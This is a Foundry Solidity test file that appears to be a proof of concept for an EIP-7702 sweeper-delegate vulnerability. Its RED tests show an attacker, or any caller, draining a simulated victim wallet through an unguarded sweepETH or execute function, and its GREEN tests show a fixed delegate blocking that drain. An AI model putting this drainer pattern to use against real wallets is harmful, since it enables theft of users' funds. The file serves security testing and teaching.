// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/vulnerable/DC07_SweeperDelegate.sol";
import "../src/fixed/DC07_SafeDelegate.sol";

/**
 * @title DC07_SweeperTest
 * @notice PoC tests for DC-07: Sweeper Pattern
 * @author Aditya Chotaliya [adityachotaliya.xyz]
 *
 * EIP-7702 context simulation:
 *   In real 7702, an EOA's code slot is set to `0xef0100 || delegate_address`
 *   and calls to the EOA DELEGATECALL into the delegate.
 *   Foundry's `vm.etch()` lets us simulate this: we set the EOA's bytecode
 *   to the delegate's deployed bytecode, then call the EOA directly.
 *   This faithfully reproduces the execution context (address(this) == EOA,
 *   storage reads/writes hit the EOA's storage).
 */
contract DC07_SweeperTest is Test {
    // Simulated EOA — in real 7702 this would be a key-controlled account
    address payable public victimEOA;
    uint256 public victimKey;

    address public attacker;
    address public legitimateProtocol;

    DC07_SweeperDelegate public vulnerableDelegate;
    DC07_SafeDelegate    public safeDelegate;

    function setUp() public {
        // Give the victim EOA a key (simulates a real EOA)
        victimKey  = 0xDEADBEEF;
        victimEOA  = payable(vm.addr(victimKey));
        attacker   = makeAddr("attacker");
        legitimateProtocol = makeAddr("legitimateProtocol");

        // Fund the victim EOA with 10 ETH — their life savings
        vm.deal(victimEOA, 10 ether);

        // Deploy both delegates
        vulnerableDelegate = new DC07_SweeperDelegate();
        safeDelegate       = new DC07_SafeDelegate();
    }

    // =========================================================================
    // RED TESTS — demonstrate the exploit on the vulnerable delegate
    // =========================================================================

    /**
     * @notice RED: Attacker drains all ETH from victim EOA via sweepETH()
     *
     * Scenario: victim signed an EIP-7702 authorization pointing to the
     * sweeper delegate (disguised as a "gas optimization" contract).
     * Attacker now calls the victim EOA and sweeps all ETH.
     */
    function test_RED_SweepETH() public {
        // Simulate EIP-7702: etch vulnerable delegate bytecode onto victimEOA
        _etch7702(victimEOA, address(vulnerableDelegate));

        uint256 attackerBefore = attacker.balance;
        uint256 victimBefore   = victimEOA.balance;

        console.log("=== DC-07 SWEEPER EXPLOIT ===");
        console.log("Victim ETH before:", victimBefore / 1e18, "ETH");
        console.log("Attacker ETH before:", attackerBefore / 1e18, "ETH");

        // Attacker calls the victim EOA (which now executes the sweeper delegate)
        vm.prank(attacker);
        DC07_SweeperDelegate(victimEOA).sweepETH(payable(attacker));

        uint256 attackerAfter = attacker.balance;
        uint256 victimAfter   = victimEOA.balance;

        console.log("Victim ETH after:", victimAfter / 1e18, "ETH");
        console.log("Attacker ETH after:", attackerAfter / 1e18, "ETH");
        console.log("DRAINED:", (attackerAfter - attackerBefore) / 1e18, "ETH");

        // Assert: victim is drained, attacker has the funds
        assertEq(victimAfter, 0, "Victim should be fully drained");
        assertEq(attackerAfter - attackerBefore, victimBefore, "Attacker should have all victim ETH");
    }

    /**
     * @notice RED: Attacker uses execute() with arbitrary calldata
     *
     * Scenario: same delegation, but attacker uses the generic execute()
     * to call any target — e.g., drain an ERC-20 via transferFrom.
     * Here we simulate it by sending ETH to attacker via execute().
     */
    function test_RED_ExecuteArbitraryCall() public {
        _etch7702(victimEOA, address(vulnerableDelegate));

        vm.prank(attacker);
        // execute() with empty calldata just sends ETH — enough to drain
        DC07_SweeperDelegate(victimEOA).execute{value: 0}(
            attacker,
            abi.encodeWithSignature("") // empty — target just receives ETH
        );

        // More direct: attacker sends a call that transfers value
        // (victim has 10 ETH in its balance, delegate runs in victim's context)
        vm.prank(attacker);
        (bool ok,) = victimEOA.call(
            abi.encodeWithSelector(
                DC07_SweeperDelegate.sweepETH.selector,
                attacker
            )
        );
        assertTrue(ok, "Sweep should succeed");
        assertEq(victimEOA.balance, 0, "Victim fully drained");
    }

    /**
     * @notice RED: Third party (not the victim) can call execute()
     *
     * This proves the auth gap: execute() has zero access control,
     * so ANYONE — not just the victim — can trigger it.
     */
    function test_RED_AnyoneCanCallExecute() public {
        _etch7702(victimEOA, address(vulnerableDelegate));

        address randomUser = makeAddr("randomUser");
        vm.deal(randomUser, 1 ether);

        // Random user (not victim, not attacker) drains the EOA
        vm.prank(randomUser);
        DC07_SweeperDelegate(victimEOA).sweepETH(payable(randomUser));

        assertEq(victimEOA.balance, 0, "Anyone can drain — no auth check");
    }

    // =========================================================================
    // GREEN TESTS — demonstrate the fix on the safe delegate
    // =========================================================================

    /**
     * @notice GREEN: Attacker CANNOT call execute() on safe delegate
     *
     * The safe delegate's onlyOwner modifier blocks external callers.
     */
    function test_GREEN_AttackerBlockedBySafeDelegate() public {
        _etch7702(victimEOA, address(safeDelegate));

        // Initialize: victim adds legitimateProtocol to allowlist
        // (In real 7702 this would be done atomically in the same tx as authorization)
        vm.prank(victimEOA);
        // Can't call onlyOwner from outside — initialize is open but still requires msg.sender == tx.origin
        // We skip initialize here to test the attack path

        uint256 victimBefore = victimEOA.balance;

        // Attacker tries to sweep — should revert
        vm.prank(attacker);
        vm.expectRevert("DC07: only the EOA owner can call this");
        DC07_SafeDelegate(victimEOA).execute(
            attacker,
            ""
        );

        // Victim's balance is untouched
        assertEq(victimEOA.balance, victimBefore, "Safe delegate: victim balance protected");
        console.log("=== DC-07 FIXED: Attacker blocked ===");
        console.log("Victim ETH still safe:", victimEOA.balance / 1e18, "ETH");
    }

    /**
     * @notice GREEN: Non-allowlisted target is rejected even by owner
     *
     * Even if the EOA itself calls execute(), the target must be allowlisted.
     */
    function test_GREEN_NonAllowlistedTargetRejected() public {
        _etch7702(victimEOA, address(safeDelegate));

        address sneakyTarget = makeAddr("sneakyTarget");

        // Even the EOA owner can't call a non-allowlisted target
        // (simulate owner call — in practice EOA signs its own tx)
        vm.prank(victimEOA);
        vm.expectRevert("DC07: target not allowed");
        DC07_SafeDelegate(victimEOA).execute(sneakyTarget, "");
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    /**
     * @dev Simulates EIP-7702 delegation by etching the delegate's runtime
     *      bytecode onto the EOA address. This replicates the effect of
     *      `0xef0100 || delegate_address` in the EOA's code slot:
     *      calls to the EOA execute the delegate's logic in the EOA's context.
     */
    function _etch7702(address eoa, address delegate) internal {
        vm.etch(eoa, delegate.code);
    }
}
